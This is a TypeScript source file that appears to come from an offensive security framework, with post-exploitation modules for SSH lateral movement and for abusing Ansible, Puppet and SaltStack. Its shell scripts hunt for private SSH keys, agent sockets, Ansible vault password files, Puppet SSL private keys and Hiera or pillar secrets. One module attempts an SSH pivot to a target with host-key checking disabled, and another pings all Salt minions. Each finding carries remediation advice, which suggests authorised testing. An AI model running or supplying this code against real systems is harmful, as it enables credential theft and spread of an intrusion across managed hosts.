import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function sshPivot(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Lateral Movement ==="]
  const target = argVal(args, "--target")
  const key = argVal(args, "--key")
  const user = argVal(args, "--user") || "root"

  const script = `
echo "--- Known Hosts (potential targets) ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/known_hosts" ]; then
    echo "[*] $dir/.ssh/known_hosts:"
    if command -v ssh-keygen >/dev/null 2>&1; then
      ssh-keygen -l -f "$dir/.ssh/known_hosts" 2>/dev/null | head -20
    else
      cat "$dir/.ssh/known_hosts" 2>/dev/null | awk '{print $1}' | head -20
    fi
  fi
done

echo ""
echo "--- Authorized Keys (trust relationships) ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/authorized_keys" ]; then
    count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
    echo "[*] $dir/.ssh/authorized_keys: $count key(s)"
    awk '{print $3, $1}' "$dir/.ssh/authorized_keys" 2>/dev/null | head -10
  fi
done

echo ""
echo "--- SSH Config Targets ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/config" ]; then
    echo "[*] $dir/.ssh/config:"
    grep -iE "^(Host |HostName |User |IdentityFile |ProxyJump )" "$dir/.ssh/config" 2>/dev/null
  fi
done

echo ""
echo "--- Available Private Keys ---"
for dir in /root /home/*; do
  for kf in "$dir/.ssh/id_rsa" "$dir/.ssh/id_ecdsa" "$dir/.ssh/id_ed25519" "$dir/.ssh/id_dsa"; do
    if [ -f "$kf" ]; then
      enc=""
      grep -q "ENCRYPTED" "$kf" && enc="(encrypted)" || enc="(UNENCRYPTED)"
      echo "[+] $kf $enc"
    fi
  done
done

echo ""
echo "--- SSH Agent Sockets ---"
find /tmp -name "agent.*" -type s 2>/dev/null | head -5
[ -n "$SSH_AUTH_SOCK" ] && echo "[+] SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
${target ? `
echo ""
echo "--- Attempting connection to ${target} ---"
ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no ${key ? `-i ${key}` : ""} ${user}@${target} "hostname; id; ip addr show 2>/dev/null | grep inet" 2>&1
` : ""}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const hosts = (r.stdout.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g) || [])
  const uniqueHosts = [...new Set(hosts)]
  if (uniqueHosts.length > 0) {
    findings.push({
      checkId: "LNX-SSHPIVOT-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_targets",
      title: "SSH pivot targets identified",
      details: `${uniqueHosts.length} unique IP(s) found in known_hosts/config — potential lateral movement targets via SSH`,
      remediation: "Limit SSH trust relationships. Use bastion hosts with MFA. Rotate SSH keys regularly.",
    })
  }

  const unencKeys = (r.stdout.match(/UNENCRYPTED/g) || []).length
  if (unencKeys > 0) {
    findings.push({
      checkId: "LNX-SSHPIVOT-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_keys",
      title: "Unencrypted SSH keys available for pivoting",
      details: `${unencKeys} unencrypted private key(s) found — can be used directly for lateral movement without passphrase`,
      remediation: "Encrypt all SSH private keys with strong passphrases.",
    })
  }

  if (target && r.stdout.includes("hostname")) {
    findings.push({
      checkId: "LNX-SSHPIVOT-003",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "EXPLOITED",
      resource: target,
      title: `SSH pivot successful to ${target}`,
      details: `Successfully authenticated to ${target} as ${user} — lateral movement confirmed`,
      remediation: "Revoke compromised SSH keys. Implement network segmentation and SSH certificate authentication.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ansibleAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Ansible Abuse ==="]

  const script = `
echo "--- Ansible Installation ---"
command -v ansible && ansible --version 2>/dev/null | head -3 || echo "[-] ansible not found in PATH"
command -v ansible-playbook >/dev/null 2>&1 && echo "[+] ansible-playbook available"
command -v ansible-vault >/dev/null 2>&1 && echo "[+] ansible-vault available"

echo ""
echo "--- Ansible Configuration Files ---"
for f in /etc/ansible/ansible.cfg ~/.ansible.cfg ./ansible.cfg; do
  if [ -f "$f" ]; then
    echo "[+] Config: $f"
    grep -iE "(remote_user|private_key_file|vault_password_file|become|ask_pass)" "$f" 2>/dev/null
  fi
done

echo ""
echo "--- Inventory Files ---"
for f in /etc/ansible/hosts ~/.ansible/hosts ./inventory ./hosts ./inventory.yml ./inventory.yaml; do
  if [ -f "$f" ]; then
    echo "[+] Inventory: $f"
    grep -vE "^(#|$)" "$f" 2>/dev/null | head -30
  fi
done
find /etc/ansible /home -name "inventory*" -o -name "hosts" 2>/dev/null | grep -i ansible | head -10

echo ""
echo "--- Vault Files ---"
find / -name "*.vault" -o -name "*vault*.yml" -o -name "*vault*.yaml" -o -name ".vault_pass*" 2>/dev/null | head -20
for dir in /etc/ansible /home/*/.ansible /home/*/projects /opt; do
  find "$dir" -name "*.yml" -exec grep -l "ANSIBLE_VAULT" {} \\; 2>/dev/null | head -10
done

echo ""
echo "--- Vault Password Files ---"
find / -name ".vault_pass*" -o -name "vault_password*" -o -name ".vault-pass*" 2>/dev/null | head -10
grep -r "vault_password_file" /etc/ansible/ ~/.ansible* 2>/dev/null

echo ""
echo "--- Playbooks ---"
find /etc/ansible /home /opt /srv -name "*.yml" -o -name "*.yaml" 2>/dev/null | xargs grep -l "hosts:" 2>/dev/null | head -20

echo ""
echo "--- SSH Keys for Ansible ---"
grep -r "private_key_file\|ansible_ssh_private_key" /etc/ansible/ ~/.ansible* 2>/dev/null
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] ansible-playbook available")) {
    findings.push({
      checkId: "LNX-ANSIBLE-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ansible",
      title: "Ansible control node detected",
      details: "Ansible is installed with playbook execution capability — can be used to execute commands across all managed hosts",
      remediation: "Restrict Ansible access to authorized users. Use Ansible Vault for all secrets. Limit sudo in playbooks.",
    })
  }

  if (r.stdout.includes("Inventory:")) {
    const inventoryCount = (r.stdout.match(/Inventory:/g) || []).length
    findings.push({
      checkId: "LNX-ANSIBLE-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ansible_inventory",
      title: "Ansible inventory files found",
      details: `${inventoryCount} inventory file(s) found — contains target hosts for lateral movement`,
      remediation: "Protect inventory files with strict permissions (600). Use dynamic inventory with authentication.",
    })
  }

  if (r.stdout.includes("ANSIBLE_VAULT") || r.stdout.includes(".vault")) {
    findings.push({
      checkId: "LNX-ANSIBLE-003",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ansible_vault",
      title: "Ansible vault files found",
      details: "Encrypted vault files detected — may contain credentials, API keys, or other secrets. Attempt decryption with found vault password files.",
      remediation: "Rotate all secrets stored in Ansible vaults. Use external secret management (HashiCorp Vault, AWS Secrets Manager).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function puppetAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Puppet Abuse ==="]

  const script = `
echo "--- Puppet Installation ---"
command -v puppet && puppet --version 2>/dev/null || echo "[-] puppet not found"
command -v facter >/dev/null 2>&1 && echo "[+] facter available"

echo ""
echo "--- Puppet Configuration ---"
for d in /etc/puppet /etc/puppetlabs/puppet /opt/puppetlabs/puppet; do
  if [ -d "$d" ]; then
    echo "[+] Config dir: $d"
    cat "$d/puppet.conf" 2>/dev/null | grep -vE "^(#|$)" | head -20
  fi
done

echo ""
echo "--- Puppet SSL Certificates ---"
for d in /etc/puppet/ssl /etc/puppetlabs/puppet/ssl /var/lib/puppet/ssl; do
  if [ -d "$d" ]; then
    echo "[+] SSL dir: $d"
    ls -la "$d/private_keys/" 2>/dev/null
    ls -la "$d/certs/" 2>/dev/null
  fi
done

echo ""
echo "--- Puppet Manifests & Modules ---"
find /etc/puppet /etc/puppetlabs /opt/puppetlabs -name "*.pp" 2>/dev/null | head -20

echo ""
echo "--- Hiera Data (secrets) ---"
find /etc/puppet /etc/puppetlabs -name "hiera.yaml" -o -name "*.eyaml" 2>/dev/null | head -10
find /etc/puppet /etc/puppetlabs -path "*/data/*.yaml" 2>/dev/null | xargs grep -l "password\|secret\|token" 2>/dev/null | head -10

echo ""
echo "--- Puppet Master Check ---"
ps aux 2>/dev/null | grep -i "puppet.*master\|puppetserver" | grep -v grep
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] SSL dir:")) {
    findings.push({
      checkId: "LNX-PUPPET-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "puppet_certs",
      title: "Puppet SSL certificates and private keys found",
      details: "Puppet SSL private keys accessible — can impersonate puppet agent or master for code execution on managed nodes",
      remediation: "Restrict Puppet SSL directory permissions. Rotate certificates.",
    })
  }

  if (r.stdout.includes("password") || r.stdout.includes(".eyaml")) {
    findings.push({
      checkId: "LNX-PUPPET-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "puppet_hiera",
      title: "Puppet Hiera data with potential secrets",
      details: "Hiera data files contain password/secret references — may contain plaintext or eyaml-encrypted credentials",
      remediation: "Use eyaml encryption for all Hiera secrets. Restrict access to Hiera data directories.",
    })
  }

  if (r.stdout.includes("puppetserver")) {
    findings.push({
      checkId: "LNX-PUPPET-003",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "FOUND",
      resource: "puppet_master",
      title: "Puppet master/server running on this host",
      details: "This host is a Puppet master — full control over all managed nodes for code execution",
      remediation: "Harden Puppet master access. Use RBAC. Restrict manifest editing.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function saltAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SaltStack Abuse ==="]

  const script = `
echo "--- Salt Installation ---"
command -v salt && salt --version 2>/dev/null || echo "[-] salt not found"
command -v salt-call >/dev/null 2>&1 && echo "[+] salt-call available"
command -v salt-key >/dev/null 2>&1 && echo "[+] salt-key available (master)"

echo ""
echo "--- Salt Configuration ---"
for f in /etc/salt/master /etc/salt/minion /etc/salt/master.d/*.conf /etc/salt/minion.d/*.conf; do
  if [ -f "$f" ]; then
    echo "[+] Config: $f"
    grep -iE "(master:|interface:|user:|root_dir:|pki_dir:|publish_port:|ret_port:)" "$f" 2>/dev/null
  fi
done

echo ""
echo "--- Salt Keys ---"
if [ -d /etc/salt/pki ]; then
  echo "[+] PKI directory found"
  find /etc/salt/pki -name "*.pem" 2>/dev/null | head -20
  ls -la /etc/salt/pki/master/minions/ 2>/dev/null | head -20
fi
salt-key -L 2>/dev/null

echo ""
echo "--- Salt Pillar Data (secrets) ---"
find /srv/pillar /etc/salt/pillar -name "*.sls" 2>/dev/null | xargs grep -l "password\|secret\|key\|token" 2>/dev/null | head -10
find /srv/salt /etc/salt -name "*.sls" 2>/dev/null | head -20

echo ""
echo "--- Salt Master Test ---"
salt-call test.ping 2>/dev/null
salt '*' test.ping 2>/dev/null 2>&1 | head -10
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] salt-key available")) {
    findings.push({
      checkId: "LNX-SALT-001",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "FOUND",
      resource: "salt_master",
      title: "SaltStack master detected",
      details: "This host is a Salt master — can execute arbitrary commands on all connected minions via salt '*' cmd.run",
      remediation: "Restrict Salt master access. Use ACLs and external_auth. Rotate master keys.",
    })
  }

  if (r.stdout.includes("[+] salt-call available")) {
    findings.push({
      checkId: "LNX-SALT-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "salt_minion",
      title: "SaltStack minion detected",
      details: "Salt minion is installed — master connection details and keys may enable lateral movement to the master",
      remediation: "Restrict minion key access. Use encrypted pillar data.",
    })
  }

  return { output: output.join("\n"), findings }
}
